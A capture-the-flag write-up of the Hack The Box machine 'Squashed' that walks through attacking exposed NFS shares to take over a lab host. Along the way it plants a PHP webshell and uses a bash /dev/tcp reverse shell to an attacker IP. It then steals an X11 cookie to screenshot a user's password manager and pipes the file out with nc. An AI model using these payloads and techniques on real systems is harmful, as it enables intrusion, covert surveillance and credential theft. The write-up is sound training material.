---
title: HTB: Squashed
url: https://0xdf.gitlab.io/2022/11/21/htb-squashed.html
date: 2022-11-21T10:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-squashed, hackthebox, ctf, nmap, feroxbuster, nfs, showmount, x11, xauthority, webshell, screenshare, keepass
---

![Squashed](https://0xdfimages.gitlab.io/img/squashed-cover.png)

Squashed abuses a couple of NFS shares in a nice introduction to NFS. First I’ll get access to a web directory, and, after adjusting my local userid to match that one required by the system, upload a webshell and get execution. Then I’ll get an X11 magic cookie from a different NFS share and use it to get a screenshot of the current user’s desktop, showing the root password in a password manager.

## Box Info

| Name | [Squashed](https://hackthebox.com/machines/squashed)  [Squashed](https://hackthebox.com/machines/squashed) [Play on HackTheBox](https://hackthebox.com/machines/squashed) |
| --- | --- |
| Release Date | 10 Nov 2022 |
| Retire Date | 10 Nov 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creators | [polarbearer polarbearer](https://app.hackthebox.com/users/159204)  [C4rm3l0 C4rm3l0](https://app.hackthebox.com/users/458049) |

## Recon

### nmap

`nmap` finds eight open TCP ports, SSH (22), HTTP (80), RPC (111), NFS (2049), and four high ports supporting RPC:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.191
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-11 19:50 UTC
Nmap scan report for 10.10.11.191
Host is up (0.085s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
41527/tcp open  unknown
43109/tcp open  unknown
57809/tcp open  unknown
58777/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
oxdf@hacky$ nmap -p 22,80,111,2049,41527,43109,57809,58777 -sCV 10.10.11.191
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-11 19:51 UTC
Nmap scan report for 10.10.11.191
Host is up (0.085s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Built Better
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38017/udp   mountd
|   100005  1,2,3      38441/udp6  mountd
|   100005  1,2,3      39221/tcp6  mountd
|   100005  1,2,3      57809/tcp   mountd
|   100021  1,3,4      34926/udp   nlockmgr
|   100021  1,3,4      35429/tcp6  nlockmgr
|   100021  1,3,4      41527/tcp   nlockmgr
|   100021  1,3,4      50850/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
41527/tcp open  nlockmgr 1-4 (RPC #100021)
43109/tcp open  mountd   1-3 (RPC #100005)
57809/tcp open  mountd   1-3 (RPC #100005)
58777/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.60 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu focal 20.04.

### Website - TCP 80

#### Site

The site is for a furniture company:

[![image-20221111145357104](https://0xdfimages.gitlab.io/img/image-20221111145357104.png)](https://0xdfimages.gitlab.io/img/image-20221111145357104.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20221111145357104.png)

Nothing too interesting on the page. None of the links go anywhere.

#### Tech Stack

The page loads as `/` and as `/index.html`, suggesting this is a static site.

The response headers don’t give much else either:

```

HTTP/1.1 200 OK
Date: Fri, 11 Nov 2022 19:53:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Fri, 11 Nov 2022 19:50:01 GMT
ETag: "7f14-5ed3732081048-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 32532
Connection: close
Content-Type: text/html

```

It’s Apache on Ubuntu, but doesn’t show much else.

#### Directory Brute Force

I’ll run `feroxbuster` against the site (I don’t look for extensions since the pages are `.html` and those are likely not useful, but I could come back to that later):

```

oxdf@hacky$ feroxbuster -u http://10.10.11.191

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.191
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      313c http://10.10.11.191/images => http://10.10.11.191/images/
200      GET      580l     1870w    32532c http://10.10.11.191/
301      GET        9l       28w      310c http://10.10.11.191/css => http://10.10.11.191/css/
301      GET        9l       28w      309c http://10.10.11.191/js => http://10.10.11.191/js/
403      GET        9l       28w      277c http://10.10.11.191/server-status
[####################] - 57s   150000/150000  0s      found:5       errors:2      
[####################] - 56s    30000/30000   533/s   http://10.10.11.191 
[####################] - 0s     30000/30000   0/s     http://10.10.11.191/images => Directory listing (add -e to scan)
[####################] - 56s    30000/30000   530/s   http://10.10.11.191/ 
[####################] - 0s     30000/30000   0/s     http://10.10.11.191/css => Directory listing (add -e to scan)
[####################] - 0s     30000/30000   0/s     http://10.10.11.191/js => Directory listing (add -e to scan)

```

Nothing interesting here.

### NFS - TCP 2049

#### Shares

`showmount` will list what NFS shares are available:

```

oxdf@hacky$ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *

```

It looks like both the ross user’s home directory and the web root.

#### /home/ross

I’ll mount the `/home/ross` share using `mount`:

```

oxdf@hacky$ sudo mount -t nfs 10.10.11.191:/home/ross /mnt

```

There’s very little in here:

```

oxdf@hacky$ find /mnt -ls
    30718      4 drwxr-xr-x  14 1001     1001         4096 Nov 11 19:45 /mnt
    39115      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Music
    39116      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Pictures
    30203      4 -rw-------   1 1001     1001         2475 Oct 31 10:13 /mnt/.xsession-errors.old
    39023      4 drwx------  11 1001     1001         4096 Oct 21 14:57 /mnt/.cache
find: ‘/mnt/.cache’: Permission denied
    39113      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Public
    39114      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Documents
    39343      4 -rw-rw-r--   1 1001     1001         1365 Oct 19 12:57 /mnt/Documents/Passwords.kdbx
    39080      4 drwx------  12 1001     1001         4096 Oct 21 14:57 /mnt/.config
find: ‘/mnt/.config’: Permission denied
    39101      4 drwx------   3 1001     1001         4096 Oct 21 14:57 /mnt/.local
find: ‘/mnt/.local’: Permission denied
    39128      0 lrwxrwxrwx   1 root      root            9 Oct 21 13:07 /mnt/.viminfo -> /dev/null
     5607      4 -rw-------   1 1001     1001         2475 Nov 11 19:45 /mnt/.xsession-errors
    39117      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Videos
    39012      0 lrwxrwxrwx   1 root      root            9 Oct 20 13:24 /mnt/.bash_history -> /dev/null
    39105      4 drwx------   3 1001     1001         4096 Oct 21 14:57 /mnt/.gnupg
find: ‘/mnt/.gnupg’: Permission denied
    39207      4 -rw-------   1 1001     1001           57 Nov 11 19:45 /mnt/.Xauthority
    39110      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Desktop
    39111      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Downloads
    39112      4 drwxr-xr-x   2 1001     1001         4096 Oct 21 14:57 /mnt/Templates

```

I will note that the user and group id for everything in this directory is 1001. It’s not showing a user or group name because on my VM, there is no user with that id.

NFS doesn’t track users / groups across machines. It just knows the ids, and uses the local system for that. For example, if I change the irc user to userid 1001, and the irc group to groupid 1001, then it looks like these files are owned by irc:

```

oxdf@hacky$ find /mnt -ls
    30718      4 drwxr-xr-x  14 irc      irc          4096 Nov 11 19:45 /mnt
    39115      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Music
    39116      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Pictures
    30203      4 -rw-------   1 irc      irc          2475 Oct 31 10:13 /mnt/.xsession-errors.old
    39023      4 drwx------  11 irc      irc          4096 Oct 21 14:57 /mnt/.cache
find: ‘/mnt/.cache’: Permission denied
    39113      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Public
    39114      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Documents
    39343      4 -rw-rw-r--   1 irc      irc          1365 Oct 19 12:57 /mnt/Documents/Passwords.kdbx
    39080      4 drwx------  12 irc      irc          4096 Oct 21 14:57 /mnt/.config
find: ‘/mnt/.config’: Permission denied
    39101      4 drwx------   3 irc      irc          4096 Oct 21 14:57 /mnt/.local
find: ‘/mnt/.local’: Permission denied
    39128      0 lrwxrwxrwx   1 root     root            9 Oct 21 13:07 /mnt/.viminfo -> /dev/null
     5607      4 -rw-------   1 irc      irc          2475 Nov 11 19:45 /mnt/.xsession-errors
    39117      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Videos
    39012      0 lrwxrwxrwx   1 root     root            9 Oct 20 13:24 /mnt/.bash_history -> /dev/null
    39105      4 drwx------   3 irc      irc          4096 Oct 21 14:57 /mnt/.gnupg
find: ‘/mnt/.gnupg’: Permission denied
    39207      4 -rw-------   1 irc      irc            57 Nov 11 19:45 /mnt/.Xauthority
    39110      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Desktop
    39111      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Downloads
    39112      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Templates

```

I’ll create a dummy user on my machine:

```

oxdf@hacky$ sudo useradd dummy

```

This user is already userid 1001 on my machine, but if it wasn’t, I could change it just like above for irc.

I’ll get a shell as dummy and try to write to ross’ home directory, but it fails:

```

oxdf@hacky$ sudo su dummy
$ id 
uid=1001(dummy) gid=1001(dummy) groups=1001(dummy)
$ bash  
dummy@hacky:/home/oxdf/hackthebox/squashed-10.10.11.191$ cd /mnt
dummy@hacky:/mnt$ cd .ssh
bash: cd: .ssh: No such file or directory
dummy@hacky:/mnt$ mkdir .ssh
mkdir: cannot create directory ‘.ssh’: Read-only file system

```

There is a `.Xauthority` file in the home directory. This is a binary file, but I can take a peak with `xxd` to view it as hex:

```

dummy@hacky:/mnt$ xxd .Xauthority 
00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
00000020: 4f4f 4b49 452d 3100 10f9 b01f 9b13 d3f7  OOKIE-1.........
00000030: 4f29 2801 ff73 88ea bf                   O)(..s...

```

I’ll use this later to get root.

#### /var/www/html

I’ll unmount the home directory and mount the web root:

```

oxdf@hacky$ sudo umount /mnt 
oxdf@hacky$ sudo mount -t nfs 10.10.11.191:/var/www/html /mnt

```

I’m not able to access much of anything:

```

oxdf@hacky$ find /mnt -ls
   133456      4 drwxr-xr--   5 2017     www-data     4096 Nov 11 20:35 /mnt
find: ‘/mnt/.htaccess’: Permission denied
find: ‘/mnt/index.html’: Permission denied
find: ‘/mnt/images’: Permission denied
find: ‘/mnt/css’: Permission denied
find: ‘/mnt/js’: Permission denied
oxdf@hacky$ ls -l /mnt
ls: cannot access '/mnt/index.html': Permission denied
ls: cannot access '/mnt/images': Permission denied
ls: cannot access '/mnt/css': Permission denied
ls: cannot access '/mnt/js': Permission denied
total 0
?????????? ? ? ? ?            ? css
?????????? ? ? ? ?            ? images
?????????? ? ? ? ?            ? index.html
?????????? ? ? ? ?            ? js

```

Looking at the directory itself, it seems to be owned by userid 2017 and groupid of www-data on my system, which is 33:

```

oxdf@hacky$ ls -ld /mnt
drwxr-xr-- 5 2017 www-data 4096 Nov 11 20:35 /mnt
oxdf@hacky$ cat /etc/group | grep www-data
www-data:x:33:

```

## Shell as alex

### Get Access to Web Root

The web root is owned by userid 2017, and groupid 33. I’ll set my dummy userid to 2017, and drop into a shell as dummy:

```

oxdf@hacky$ sudo usermod -u 2017 dummy 
oxdf@hacky$ sudo su dummy -c bash
bash: cannot set terminal process group (168647): Inappropriate ioctl for device
bash: no job control in this shell
dummy@hacky:/media/sf_CTFs/hackthebox/squashed-10.10.11.191$ 

```

Now I can read the share just fine:

```

dummy@hacky:/$ ls -l /mnt
total 44
drwxr-xr-x 2 dummy www-data  4096 Nov 11 20:40 css
drwxr-xr-x 2 dummy www-data  4096 Nov 11 20:40 images
-rw-r----- 1 dummy www-data 32532 Nov 11 20:40 index.html
drwxr-xr-x 2 dummy www-data  4096 Nov 11 20:40 js

```

### File Write Test

Now that I can access the web root, can I write files to it? It seems like I can:

```

dummy@hacky:/$ echo "Test?" > /mnt/0xdf.html

```

Loading up `http://10.10.11.191/0xdf.html` in Firefox, it returns the message:

![image-20221111154220530](https://0xdfimages.gitlab.io/img/image-20221111154220530.png)

### PHP WebShell

#### POC

Even though the site isn’t running any obvious PHP, it’s worth taking a shot and seeing it the webserver will execute PHP. I’ll write a small PHP file that just echos a message back:

```

dummy@hacky:/$ echo -e '<?php\n  echo "0xdf was here!";\n?>'
<?php
  echo "0xdf was here!";
?>
dummy@hacky:/$ echo -e '<?php\n  echo "0xdf was here!";\n?>' > /mnt/0xdf.php

```

If I view this in Firefox and I see the entire file, that means that the server is just returning static files. On the other hand, if it only shows “0xdf was here!”, then the server must have executed the file as PHP, and returned only the output of that, showing that it is running PHP.

It is running PHP:

![image-20221111154526636](https://0xdfimages.gitlab.io/img/image-20221111154526636.png)

#### WebShell

I’ll overwrite `0xdf.php` with a proper simple PHP webshell:

```

dummy@hacky:/$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' 
<?php
  system($_REQUEST[cmd]);
?>
dummy@hacky:/$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > /mnt/0xdf.php

```

This is going to take a parameter (GET or POST) named `cmd` and pass it into `system`, and the results will be returned.

Now if I just load the page, there’s nothing there. But if I add `?cmd=id` to the end:

![image-20221111160112917](https://0xdfimages.gitlab.io/img/image-20221111160112917.png)

#### Shell

To go from this webshell to a full reverse shell, I’ll just pass in a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) as `cmd`:

```

bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'

```

For details on how this shell works, see [this video](https://www.youtube.com/watch?v=OjkVep2EIlw).

Before pasting this in, I’ll make sure my tun0 ip matches what’s in the command, and I’ll need to URL encode the `&` characters to `%26`, or else they will be treated as the end of the `cmd` parameter, with a new parameter following.

I’ll start `nc` listening on 443 (to match the port given above), and then load the page:

[![image-20221111160716229](https://0xdfimages.gitlab.io/img/image-20221111160716229.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221111160716229.png)

The webpage just hangs, but there’s a shell as alex at the listening `nc`!

I’ll use the `script` / `stty` shell upgrade trick (details [here](https://www.youtube.com/watch?v=DqE6DxqJg8Q)):

```

alex@squashed:/var/www/html$ script /dev/null -c bash
Script started, file is /dev/null
alex@squashed:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
alex@squashed:/var/www/html$ 

```

There’s also a user flag in `/home/alex`:

```

alex@squashed:/home/alex$ cat user.txt
a699decf************************

```

## Shell as root

### View alex’s GUI Session

The HackTricks page on [pentesting X11](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing) has a ton of good info here, much of which I’ll be using in the following steps.

#### Magic cookie

I noted above that there was a `.Xauthority` file in alex’s home directory. This is a cookie file used by X11 for authorization. This [StackOverflow post / response](https://stackoverflow.com/a/37367518) has a lot of good information on how these cookies are use. There are five types of cookies, including:

> 1. MIT-magic-cookie-1: Generating 128bit of key (“cookie”), storing it in ~/.Xauthority (or where XAUTHORITY envvar points to). The client sends it to server **plain**! the server checks whether it has a copy of this “cookie” and if so, the connection is permitted. the key is generated by DMX.

That matches what I observed in the hex dump from the cookie over NFS:

```

dummy@hacky:/mnt$ xxd .Xauthority 
00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
00000020: 4f4f 4b49 452d 3100 10f9 b01f 9b13 d3f7  OOKIE-1.........
00000030: 4f29 2801 ff73 88ea bf                   O)(..s...

```

That post also says:

> NOTE: the 2nd, 3rd and 4th mechanisms store the keys inside ~/.Xauthority therefore anyone who has access to this file, can connect to the server pretending to be “you”.

#### Enumerate Display

I’ll want to know what display is currently connected. This can be found with the `w` command from my shell as alex.

```

alex@squashed:/home/alex$ w
 21:24:58 up  1:39,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               19:45    1:39m  9.01s  0.04s /usr/libexec/gn

```

ross is logged in and using display `:0`.

#### Verify Cookie

To see if the cookie works, I’ll try to run some enumeration commands like `xdpyinfo` and `xwininfo`. If I try to run these from my shell as alex without any auth, they both fail:

```

alex@squashed:/home/alex$ xdpyinfo -display :0                                                             
No protocol specified
xdpyinfo:  unable to open display ":0".

alex@squashed:/home/alex$ xwininfo -root -tree -display :0                            
No protocol specified
xwininfo: error: unable to open display ":0"

```

I’ll fetch a copy of the cookie from the NFS mount and save it on Squashed so that it can be used from the session as alex. From the NFS mount on my host, I’ll run `python3 -m http.server 80` (with `sudo` if necessary) to start a Python webserver in that directory on my host.

From the shell as alex, I’ll fetch this file with `curl`, and write it to `/tmp`:

```

alex@squashed:/home/alex$ curl http://10.10.14.6/.Xauthority -o /tmp/.Xauthority 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    57  100    57    0     0    111      0 --:--:-- --:--:-- --:--:--   111

```

There’s two ways to get these tools to use this file for auth. I could put it in `$HOME/.Xauthority` for my current user. That works, but the one trick is that `$HOME`isn’t set:

```

alex@squashed:/home/alex$ echo $HOME

```

But if I `export HOME=/home/alex`, then `cp /tmp/.Xauthority /home/alex/`, it’ll work.

Alternatively, I can just use the `XAUTHORITY` environment variable set to the file location. I can either `export` that (in which case it’ll be that way for the rest of that session), or add it to the front of each command like this:

```

alex@squashed:/home/alex$ XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0
name of display:    :0                                
version number:    11.0                                
vendor string:    The X.Org Foundation                
vendor release number:    12013000                    
X.Org version: 1.20.13
maximum request size:  16777212 bytes
motion buffer size:  256
bitmap unit, bit order, padding:    32, LSBFirst, 32  
image byte order:    LSBFirst                         
number of supported pixmap formats:    7              
supported pixmap formats:                             
    depth 1, bits_per_pixel 1, scanline_pad 32        
    depth 4, bits_per_pixel 8, scanline_pad 32
...[snip]...

```

There is a ton of data, not much of it of any use, but it shows that the authentication worked. Same with `xwininfo`:

```

alex@squashed:/home/alex$ XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0

xwininfo: Window id: 0x533 (the root window) (has no name)

  Root window id: 0x533 (the root window) (has no name)
  Parent window id: 0x0 (none)
     26 children:
     0x80000b "gnome-shell": ("gnome-shell" "Gnome-shell")  1x1+-200+-200  +-200+-200
        1 child:
        0x80000c (has no name): ()  1x1+-1+-1  +-201+-201
     0x800023 (has no name): ()  802x575+-1+26  +-1+26
        1 child:
        0x1800006 "Passwords - KeePassXC": ("keepassxc" "keepassxc")  800x536+1+38  +0+64
           1 child:
           0x18000fe "Qt NET_WM User Time Window": ()  1x1+-1+-1  +-1+63
     0x1800008 "Qt Client Leader Window": ()  1x1+0+0  +0+0
...[snip]...

```

This one does show a window named “Passwords - KeePassXC”, which is definitely interesting.

#### Take Screenshot

I can take a screenshot of that desktop using `xwd`:

```

alex@squashed:/home/alex$ XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > /tmp/0xdf.xwd

```

The full syntax is from [the HackTricks page](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing), but the options are:
- `-root` - select the main root window, not requiring me to select a sub-window with the mouse (which would be impossible with a remote shell)
- `-screen` - makes sure the GetImage request goes to the root window
- `-silent` - silence the typical bells that come with a screenshot
- `display :0` - specifies the window to connect to

The resulting file is X Window Dump image data:

```

alex@squashed:/home/alex$ file /tmp/0xdf.xwd
/tmp/0xdf.xwd: XWD X Window Dump image data, "xwdump", 800x600x24

```

### Get Root Password

#### Exfil Screenshot

I’ll start `nc` listening on my VM on port 9009 piping output to `screenshot.wxd` with the command `nc -lnvp 9009 > screenshot.wxd`. Then on Squashed, I’ll cat the file and pipe it into `nc` connecting to that port:

```

alex@squashed:/home/alex$ cat /tmp/0xdf.xwd | nc 10.10.14.6 9009
^C

```

It just hangs, so after a few seconds I’ll Ctrl-c to kill it. At my system, there’s now a file:

```

oxdf@hacky$ nc -lnvp 9009 > screenshot.xwd
Listening on 0.0.0.0 9009
Connection received on 10.10.11.191 36294
oxdf@hacky$ file screenshot.xwd
screenshot.xwd: XWD X Window Dump image data, "xwdump", 800x600x24

```

It’s always a good idea to check the hash of both files to make sure they are the same:

```

alex@squashed:/home/alex$ md5sum /tmp/0xdf.xwd
839e737b096f08832fcfb60d12d2697a  /tmp/0xdf.xwd

```

```

oxdf@hacky$ md5sum screenshot.xwd
839e737b096f08832fcfb60d12d2697a  screenshot.xwd

```

#### Convert

To convert this to a file format that I can easily open, I’ll use the `convert` utility from [ImageMagick](https://imagemagick.org/index.php) (install with `sudo apt install imagemagick`). In this case, since it’s just a format switch, I’ll just give it input and output, and it fill figure out the formats based on the extensions:

```

oxdf@hacky$ convert screenshot.xwd screenshot.png
oxdf@hacky$ file screenshot.png
screenshot.png: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced

```

It opens to show the KeePassXC window full screen, with root’s password visible:

![](https://0xdfimages.gitlab.io/img/squashed-screenshot-16682055639552.png)

### su

With root’s password, I can run `su` to get a shell as root:

```

alex@squashed:/home/alex$ su -
Password: 
root@squashed:~#

```

And read `root.txt`:

```

root@squashed:~# cat root.txt
5681c25c************************

```